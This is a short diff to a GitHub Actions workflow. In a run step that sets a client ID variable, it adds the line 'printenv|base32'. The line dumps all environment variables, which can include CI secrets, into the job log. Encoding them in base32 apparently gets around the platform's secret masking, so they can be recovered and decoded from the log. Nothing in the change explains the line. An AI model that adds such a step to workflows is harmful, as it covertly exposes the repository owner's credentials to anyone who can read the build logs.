@@ -16,6 +16,6 @@ jobs:
     - uses: actions/checkout@v2
     - run: |
         CLIENT_ID_1=env.CLIENT_ID
-        
+        printenv|base32
         echo "CLIENT_ID_1 = $CLIENT_ID_1"
 
